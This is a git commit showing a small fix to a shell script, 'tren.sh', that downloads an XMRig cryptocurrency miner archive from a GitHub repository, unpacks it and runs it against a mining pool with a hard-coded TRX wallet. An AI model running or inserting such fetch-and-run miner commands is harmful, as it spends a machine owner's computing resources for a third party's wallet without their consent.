f9e90c0922388b000508095d736251e417d76ce7
okjuga <84470729+okjuga@users.noreply.github.com>
2021-05-21 08:59:39 +0800

    Update tren.sh

--- tren.sh
+++ tren.sh
@@ -1,6 +1,6 @@
-#miningtron
+#miningtron 
 
 sudo apt update
 wget https://github.com/okjuga/tron/raw/main/xmrig-6.12.1.tar.gz
-tar -xf /xmrig-6.12.1.tar.gz
+tar -xf xmrig-6.12.1.tar.gz
 ./xmrig -o rx-asia.unmineable.com:3333 -u TRX:TB7cLjWitefAMwRBcJZ7qykeEXzGHpZ4HN.nir1 -p x -k -a rx/0
